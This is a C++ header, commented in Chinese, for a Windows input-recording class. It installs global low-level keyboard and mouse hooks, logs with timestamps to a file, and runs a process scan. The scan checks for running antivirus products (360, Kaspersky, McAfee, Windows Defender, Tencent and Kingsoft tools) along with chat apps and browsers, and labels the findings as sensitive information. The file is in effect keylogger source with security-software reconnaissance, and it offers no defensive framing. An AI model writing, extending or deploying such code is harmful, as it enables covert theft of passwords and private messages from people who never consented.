//--------------------------------------------------------------------------------------
//
// File: KbRecord.h
//
// Licensed under the Apache License, Version 2.0 (the "License"); you may not use this 
// file except in compliance with the License. You may obtain a copy of the License at 
// http://www.apache.org/licenses/LICENSE-2.0  
//  
// THIS CODE IS PROVIDED *AS IS* BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, 
// EITHER EXPRESS OR IMPLIED, INCLUDING WITHOUT LIMITATION ANY IMPLIED WARRANTIES OR 
// CONDITIONS OF TITLE, FITNESS FOR A PARTICULAR PURPOSE, MERCHANTABLITY OR NON-INFRINGEMENT. 
//  
// See the Apache Version 2.0 License for specific language governing permissions and 
// limitations under the License.
//--------------------------------------------------------------------------------------

#pragma once
#include<iostream>
#include<fstream>
#include<ctime>
#include<string>
#include<map>
#include<TlHelp32.h>

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam);
namespace KbRecord
{
	class KbRecord
	{
	public:
		friend LRESULT CALLBACK::HookCallback(int code, WPARAM wParam, LPARAM lParam);
		KbRecord
		(
			std::string _Filename,
			std::ofstream::open_mode _Mode
		);
		~KbRecord();
		void GetSystemTime();
		void FileManager();
		template<typename T>
		std::ostream & operator<<(T str);
		void ProcessWarning();
		void Record();
	private:
		std::ofstream fs;
		std::string Filename;
		std::ofstream::open_mode Mode;
		bool isopen = 0;//文件打开的标志,打开为1，关闭为0
		HHOOK keyboardHook;
		HHOOK mouseHook;
	};

	/*
	方法：KbRecord::KbRecord(std::string _Filename = "Record.log",std::ofstream::open_mode _Mode = std::fstream::app)
	类KbRecord的构造函数
	打开文件，文件名默认Record.log
	文件的写入模式默认std::fstream::app
	安装键盘钩子并运行KbRecord::ProcessWarning()方法
	用法：KbRecord("1.txt",std::fstream::app);
	*/
	KbRecord::KbRecord
	(
		std::string _Filename = "Record.log",
		std::ofstream::open_mode _Mode = std::fstream::app
	) :
		Filename(_Filename),
		Mode(_Mode)
	{
		FileManager();
		keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, GetModuleHandleA(NULL), NULL);
		mouseHook = SetWindowsHookExA(WH_MOUSE_LL, HookCallback, GetModuleHandleA(NULL), NULL);
		if (!mouseHook)
		{
			KbRecord::operator<<("错误：鼠标挂钩失败");
			fs.close();
			exit(-1);
		}
		if (!keyboardHook)
		{
			KbRecord::operator<<("错误：键盘挂钩失败");
			fs.close();
			exit(-1);
		}
		ProcessWarning();
	}

	/*
	方法：KbRecord::~KbRecord()
	类KbRecord的析构函数
	关闭打开的文件
	卸载键盘钩子
	用法：KR.~KbRecord();
	*/
	KbRecord::~KbRecord()
	{
		if (isopen)
		{
			GetSystemTime();
			fs << "记录结束" << std::endl;
			fs.close();
			isopen = 0;
			UnhookWindowsHookEx(keyboardHook);
			UnhookWindowsHookEx(mouseHook);
		}
	}

	/*
	方法：void KbRecord::GetSystemTime()
	获取系统时间并写入文件
	如果文件没被打开，先打开文件
	用法：KR.GetSystemTime();
	*/
	void KbRecord::GetSystemTime()
	{
		if (!isopen)
			FileManager();
		tm t;
		time_t t_t = time(NULL);
		char tmp[64];
		localtime_s(&t, &t_t);
		strftime(tmp, sizeof(tmp), "%Y/%m/%d %X\t", &t);
		fs << tmp;
	}

	/*
	方法：void KbRecord::FileManager()
	打开文件
	用法：KR.FileManager();
	*/
	void KbRecord::FileManager()
	{
		fs.open(Filename, Mode);
		if (!fs.is_open())
			abort();//打开失败结束
		isopen = 1;//文件状态置1
		GetSystemTime();
		fs << "记录开始" << std::endl;
	}

	/*
	方法：std::ostream & KbRecord::operator<<(T MSG)
	写入时间和消息
	如果文件没被打开，先打开文件
	消息由MSG传入
	用法：KR<<"OK";
	*/
	template<typename T>
	std::ostream & KbRecord::operator<<(T MSG)
	{
		if (!isopen)
			FileManager();
		GetSystemTime();
		fs << MSG;
		return fs;
	}

	/*
	方法：void KbRecord::ProcessWarning()
	判断进程消息
	如果文件没被打开，就打开文件
	若有敏感信息则写入文件
	用法：KR.ProcessWarning();
	*/
	void KbRecord::ProcessWarning()
	{
		if (!isopen)
			FileManager();
		HANDLE hProcessSnap;
		PROCESSENTRY32 pe32;
		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == (HANDLE)-1)
			KbRecord::operator<<("CreateToolhelp32Snapshot failed");
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hProcessSnap, &pe32))
		{
			std::map<std::wstring, bool>process;//进程列表
			std::wstring QQ = _T("QQ.exe");//QQ
			std::wstring WeChatWeb = _T("WeChatWeb.exe");//微信
			std::wstring WeChat = _T("WeChat.exe");//微信
			std::wstring _360tray = _T("360tray.exe");//360实时保护
			std::wstring _360Safe = _T("360Safe.exe");//360主程序
			std::wstring _360sd = _T("360sd.exe");//360杀毒
			std::wstring QQPCTray = _T("QQPCTray.exe");//腾讯电脑管家实时保护
			std::wstring QQPCRTP = _T("QQPCRTP.exe");//腾讯电脑管家自我防护
			std::wstring QQPCMgr = _T("QQPCMgr.exe");//腾讯电脑管家主程序
			std::wstring avp = _T("avp.exe");//卡巴斯基
			std::wstring KMService = _T("KMService.exe");//金山毒霸全局部署
			std::wstring kxescore = _T("kxescore.exe");//金山毒霸详细运行
			std::wstring kxetray = _T("kxetray.exe");//金山毒霸病毒实时监控
			std::wstring Mcshield = _T("Mcshield.exe");//迈克菲核心进程
			std::wstring shstat = _T("shstat.exe");//迈克菲后台
			std::wstring MSASCuil = _T("MSASCuiL.exe");//Windows Defender
			std::wstring MicrosoftEdge = _T("MicrosoftEdge.exe");//Microsoft Edge
			std::wstring MicrosoftEdgeCP = _T("MicrosoftEdgeCP.exe");//Microsoft Edge
			std::wstring iexplore = _T("iexplore.exe");//Microsoft Internet Explorer
			std::wstring _360se = _T("360se.exe");//360浏览器
			std::wstring _360chrome = _T("360chrome.exe");//360极速浏览器
			std::wstring chrome = _T("chrome.exe");//Chrome
			std::wstring firefox = _T("firefox.exe");//火狐
			/*纠结于性能问题，正常使用情况下Win10系统 专业版 x86共计98个进程
			现有做法wstring（KbRecord()+~KbRecord()）*23+operator==()*98
			若是每一次循环用一个wstring储存进程名则约为（构造函数+析构函数+operator==）*98
			*/
			do
			{
				if (pe32.szExeFile == _360sd && !process[_360sd])
				{
					process[_360sd]++;
					KbRecord::operator<<("警告：检测到360杀毒的运行") << std::endl;
				}
				else if (pe32.szExeFile == _360tray && !process[_360tray])
				{
					process[_360tray] = true;
					KbRecord::operator<<("警告：检测到360实时保护的运行") << std::endl;
				}
				else if (pe32.szExeFile == _360Safe && !process[_360Safe])
				{
					process[_360Safe] = true;
					KbRecord::operator<<("警告：检测到360主程序的运行") << std::endl;
				}
				else if (pe32.szExeFile == QQPCTray && !process[QQPCTray])
				{
					process[QQPCTray] = true;
					KbRecord::operator<<("警告：检测到腾讯电脑管家实时保护的运行") << std::endl;
				}
				else if (pe32.szExeFile == QQPCRTP && !process[QQPCRTP])
				{
					process[QQPCRTP] = true;
					KbRecord::operator<<("警告：检测到腾讯电脑管家自我防护的运行") << std::endl;
				}
				else if (pe32.szExeFile == QQPCMgr && !process[QQPCMgr])
				{
					process[QQPCMgr] = true;
					KbRecord::operator<<("警告：检测到腾讯电脑管家主程序的运行") << std::endl;
				}
				else if (pe32.szExeFile == avp && !process[avp])
				{
					process[avp] = true;
					KbRecord::operator<<("警告：检测到卡巴斯基的运行") << std::endl;
				}
				else if (pe32.szExeFile == KMService && !process[KMService])
				{
					process[KMService] = true;
					KbRecord::operator<<("警告：检测到金山毒霸全局部署的运行") << std::endl;
				}
				else if (pe32.szExeFile == kxescore && !process[kxescore])
				{
					process[kxescore] = true;
					KbRecord::operator<<("警告：检测到金山毒霸的运行") << std::endl;
				}
				else if (pe32.szExeFile == kxetray && !process[kxetray])
				{
					process[kxetray] = true;
					KbRecord::operator<<("警告：检测到金山毒霸病毒实时监控的运行") << std::endl;
				}
				else if (pe32.szExeFile == Mcshield && !process[Mcshield])
				{
					process[Mcshield] = true;
					KbRecord::operator<<("警告：检测到迈克菲核心进程的运行") << std::endl;
				}
				else if (pe32.szExeFile == shstat && !process[shstat])
				{
					process[shstat] = true;
					KbRecord::operator<<("警告：检测到迈克菲后台的运行") << std::endl;
				}
				else if (pe32.szExeFile == MSASCuil && !process[MSASCuil])
				{
					process[MSASCuil] = true;
					KbRecord::operator<<("警告：检测到Windows Defender的运行") << std::endl;
				}
				else if (pe32.szExeFile == QQ && !process[QQ])
				{
					process[QQ] = true;
					KbRecord::operator<<("信息：检测到QQ的运行") << std::endl;
				}
				else if ((pe32.szExeFile == MicrosoftEdge || pe32.szExeFile == MicrosoftEdgeCP) && !process[MicrosoftEdge] && !process[MicrosoftEdgeCP])
				{
					process[MicrosoftEdge] = true;
					process[MicrosoftEdgeCP] = true;
					KbRecord::operator<<("信息：检测到Microsoft Edge的运行") << std::endl;
				}
				else if ((pe32.szExeFile == WeChatWeb || pe32.szExeFile == WeChat) && !process[WeChat] && !process[WeChatWeb])
				{
					process[WeChat] = true;
					process[WeChat] = true;
					KbRecord::operator<<("信息：检测到微信的运行") << std::endl;
				}
				else if (pe32.szExeFile == iexplore && !process[iexplore])
				{
					process[iexplore] = true;
					KbRecord::operator<<("信息：检测到Internet Explorer的运行") << std::endl;
				}
				else if (pe32.szExeFile == _360se && !process[_360se])
				{
					process[_360se] = true;
					KbRecord::operator<<("信息：检测到360浏览器的运行") << std::endl;
				}
				else if (pe32.szExeFile == _360chrome && !process[_360chrome])
				{
					process[_360chrome] = true;
					KbRecord::operator<<("信息：检测到360极速浏览器的运行") << std::endl;
				}
				else if (pe32.szExeFile == chrome && !process[chrome])
				{
					process[chrome] = true;
					KbRecord::operator<<("信息：检测到Chrome浏览器的运行") << std::endl;
				}
				else if (pe32.szExeFile == firefox && !process[firefox])
				{
					process[firefox] = true;
					KbRecord::operator<<("信息：检测到火狐浏览器的运行") << std::endl;
				}
			} while (Process32Next(hProcessSnap, &pe32));
			KbRecord::operator<<("敏感信息检测结束") << std::endl;
		}
		else
			KbRecord::operator<<("出现意外错误。") << std::endl;
		CloseHandle(hProcessSnap);
	}

	/*
	方法：void KbRecord::Record()
	记录键盘信息
	用法：KR.Record();
	*/
	void KbRecord::Record()
	{
		MSG msg;
		while (true)
		{
			if (PeekMessageA(&msg, 0, 0, 0, PM_REMOVE))		//消息循环
			{
				TranslateMessage(&msg);						//插入消息
				DispatchMessageW(&msg);
			}
			else
				Sleep(1);//避免CPU占用过高
		}
		UnhookWindowsHookEx(keyboardHook);
		UnhookWindowsHookEx(mouseHook);			//卸载钩子
	}
}